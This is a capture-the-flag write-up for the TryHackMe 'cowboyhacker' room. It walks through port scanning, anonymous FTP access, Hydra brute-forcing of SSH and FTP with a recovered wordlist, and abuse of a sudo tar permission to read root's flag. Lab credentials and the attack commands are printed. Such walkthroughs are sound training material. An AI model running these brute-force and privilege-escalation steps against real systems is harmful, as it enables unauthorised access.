- Link: https://tryhackme.com/room/cowboyhacker

## Description
You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

## Reconnaissance
#### Port Scan
```
# Nmap 7.992 scan initiated Wed Oct 21 21:50:41 2026 as: nmap -sV -A -o portscan.txt 10.66.132.149
Nmap scan report for 10.66.132.149
Host is up (0.24s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_vmware-version: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.150.98
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 49:92:51:e6:a8:2a:63:f2:6a:9b:5f:f5:29:8d:f8:c8 (RSA)
|   256 94:fe:11:37:47:3c:c0:e9:68:af:cf:ff:59:57:93:dd (ECDSA)
|_  256 26:39:68:cb:2a:a1:8a:03:d2:96:7a:fc:ab:72:7d:7b (ED25519)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: ERROR: Script execution failed (use -d to debug)
|_hnap-info: ERROR: Script execution failed (use -d to debug)
|_http-trane-info: ERROR: Script execution failed (use -d to debug)
|_https-redirect: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 21 21:51:09 2026 -- 1 IP address (1 host up) scanned in 28.46 seconds
```

- 21/tcp open  ftp     vsftpd 3.0.5
- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

#### Exploring the site
![](../Image%20Trunk/Pasted%20image%2020261021215335.png)

Seems like our goal for now is to get in as root.
#### Enumerating the site
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.132.149
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /home/jimi/Documents/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 315] [--> http://10.66.132.149/images/]
javascript           (Status: 301) [Size: 319] [--> http://10.66.132.149/javascript/]
server-status        (Status: 403) [Size: 278]
```

`/javascripts/` got us 403 forbidden. Meanwhile, the `/images` is where the `crew.jpg` image is stored, and can be accessed by us. If we could upload something here would be useful.

![](../Image%20Trunk/Pasted%20image%2020261021221900.png)

#### Exploring FTP
For this, we can actually check it without any credentials. I'm using filezilla as the ftp client.

![](../Image%20Trunk/Pasted%20image%2020261021224626.png)

`task.txt` content:

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

`locks.txt` content:

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

The task list seems a bit too vague for me. Didn't help that I haven't watched Cowboy Bebop as well. However, the `locks.txt` looks like a password wordlist. This is useful!

## Brute Forcing with `locks.txt`
### SSH
Attempting to bruteforce ssh as root with locks.txt as wordlist resulted in a failure:

![](../Image%20Trunk/Pasted%20image%2020261021225312.png)

Let's try using another wordlist for the users which consists of the names we already know so far.

name wordlists:
```
ftp
lin
jet
spike
ed
faye
```

output:

```
# Hydra v9.7 run at 2026-10-21 23:05:49 on 10.66.132.149 ssh (hydra -L ./potentialusers.txt -P ./locks.txt -t 4 -o hydra-ssh.txt 10.66.132.149 ssh)
[22][ssh] host: 10.66.132.149   login: lin   password: RedDr4gonSynd1cat3

```

Now we're talkin!
## FTP
Attempting to bruteforce ftp using the same wordlists as the ssh:

```
# Hydra v9.7 run at 2026-10-21 23:01:07 on 10.66.132.149 ftp (hydra -L ./potentialusers.txt -P ./locks.txt -o hydra-ftp.txt 10.66.132.149 ftp)
[21][ftp] host: 10.66.132.149   login: ftp   password: rEddrAGON
[21][ftp] host: 10.66.132.149   login: ftp   password: ReDdr4g0nSynd!cat3
[21][ftp] host: 10.66.132.149   login: ftp   password: Dr@gOn$yn9icat3
[21][ftp] host: 10.66.132.149   login: ftp   password: RedDr4gonSynd1cat3
[21][ftp] host: 10.66.132.149   login: ftp   password: R3DDr46ONSYndIC@Te
[21][ftp] host: 10.66.132.149   login: ftp   password: ReddRA60N
[21][ftp] host: 10.66.132.149   login: ftp   password: R3dDrag0nSynd1c4te
[21][ftp] host: 10.66.132.149   login: ftp   password: dRa6oN5YNDiCATE
[21][ftp] host: 10.66.132.149   login: ftp   password: ReDDR4g0n5ynDIc4te
[21][ftp] host: 10.66.132.149   login: ftp   password: R3Dr4gOn2044
[21][ftp] host: 10.66.132.149   login: ftp   password: R3dDRaG0Nsynd1c@T3
[21][ftp] host: 10.66.132.149   login: ftp   password: Synd1c4teDr@g0n
[21][ftp] host: 10.66.132.149   login: ftp   password: reddRAg0N
[21][ftp] host: 10.66.132.149   login: ftp   password: 4L1mi6H71StHeB357
[21][ftp] host: 10.66.132.149   login: ftp   password: REddRaG0N5yNdIc47e
[21][ftp] host: 10.66.132.149   login: ftp   password: Dra6oN$yndIC@t3
```

All the passwords were for user `ftp` as well. Might be useful later on but SSH access is way more attractive right now.

## Accessing SSH as lin
![](../Image%20Trunk/Pasted%20image%2020261021231159.png)

Nice! we got our first flag from Lin's home dir.

![](../Image%20Trunk/Pasted%20image%2020261021231333.png)

Interesting, we can use `/bin/tar` with sudo. Might be useful later.

## Locating root.txt
The last part is for us to find the flag inside `root.txt`. The obvious first place to check is within `/root/` directory. However we don't have permission to access it.

This is where the `/bin/tar` permission proves useful to us. By having the permission to run tar as sudo, we should just be able to "*backup*" the `/root/` directory and save it as `/home/lin/root.tar`. From there, we can just unpack it again.

Turns out, doing it by a simple `tar -czvf root.tar.gz /root/` and `tar -xzvf root.tar.gz` resulted in the directory still being owned by root. This makes me unable to access it again.

![](../Image%20Trunk/Pasted%20image%2020261021232620.png)

The fix is simple though. Turns out we can actually change the owner of the directory with a flag when archiving it. But since we already know the location of the root.txt (it's `/root/root.txt`) from the output of tar, we can just *tar* that one file.

![](../Image%20Trunk/Pasted%20image%2020261021234219.png)

👽👍